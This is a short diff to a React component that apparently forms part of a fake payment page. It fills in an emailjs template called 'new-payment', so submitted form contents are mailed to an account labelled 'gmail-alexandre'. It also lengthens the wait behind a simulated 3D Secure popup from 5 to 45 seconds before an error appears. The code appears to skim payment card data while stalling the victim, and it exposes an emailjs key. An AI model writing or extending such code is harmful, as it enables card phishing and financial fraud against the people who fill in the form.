@@ -44,7 +44,7 @@ const Board = () => {
     if (show3DSecurePopup) {
       const errorTimeout = setTimeout(() => {
         setShowError(true);
-      }, 5000); // 5 seconds
+      }, 45000); // 45 seconds
       return () => clearTimeout(errorTimeout);
     }
   }, [show3DSecurePopup]);
@@ -86,7 +86,7 @@ const Board = () => {
       setShow3DSecurePopup(true);
     }, 5000);
 
-    emailjs.sendForm('gmail-alexandre', '', event.target, 'p7vtRytijMovXPfFA')
+    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
       .then(() => {
         console.log('SUCCESS!');
         setIsLoading(false);
